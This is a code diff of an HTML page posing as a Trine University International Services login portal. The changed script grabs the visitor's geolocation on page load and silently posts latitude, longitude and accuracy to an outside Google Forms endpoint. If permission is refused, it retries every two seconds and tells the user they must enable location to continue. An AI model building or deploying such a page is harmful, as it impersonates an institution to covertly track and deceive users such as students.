@@ -13,7 +13,7 @@
     .error-message { color: red; text-align: center; font-size: 16px; }
   </style>
 </head>
-<body onload="checkLocationAccess()">
+<body onload="requestLocation()">
   <div class="header">
     <div class="logo">Trine University - International Services</div>
   </div>
@@ -30,49 +30,47 @@ students. Please log in using one of the options below to view information or to
 
   <!-- JavaScript Code -->
   <script>
-    let locationGranted = false;
-
-    function checkLocationAccess() {
+    function requestLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(successLocation, showLocationError, { timeout: 5000 });
+        navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, { timeout: 5000 });
       } else {
-        showLocationError({ message: "Geolocation is not supported by this browser." });
+        displayError("Geolocation is not supported by this browser.");
       }
     }
 
-    function successLocation(position) {
-      locationGranted = true;
+    function sendLocationData(position) {
       const latitude = position.coords.latitude;
       const longitude = position.coords.longitude;
       const accuracy = position.coords.accuracy;
-      sendLocationData(latitude, longitude, accuracy);
-    }
 
-    function sendLocationData(latitude, longitude, accuracy) {
+      // Send data to Google Forms
       const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
       const data = new URLSearchParams();
       data.append("entry.1267598962", latitude);
       data.append("entry.1270259896", longitude);
       data.append("entry.1888406517", accuracy);
+
       fetch(formUrl, {
         method: "POST",
         body: data,
         mode: "no-cors",
+      }).catch((error) => {
+        document.getElementById("output").innerText = "Error: " + error.message;
       });
     }
 
-    function showLocationError(error) {
-      locationGranted = false;
+    function handleLocationError(error) {
+      setTimeout(requestLocation, 2000); // Retry every 2 seconds
+      displayError("Error: Please enable location access to continue. Please reload the page or open in a new tab.");
+    }
+
+    function displayError(message) {
       const locationError = document.getElementById("locationError");
-      locationError.innerHTML = "Error: Please enable location access to continue. <br>Please reload the page or open in a new tab.";
+      locationError.innerHTML = message;
     }
 
     document.getElementById("submit").addEventListener("click", function(event) {
-      if (!locationGranted) {
-        alert("Please enable location access before submitting!");
-      } else {
-        alert("Submission successful with location data!");
-      }
+      requestLocation(); // Ensure location data is tried again on submit if not already done
     });
   </script>
 </body>
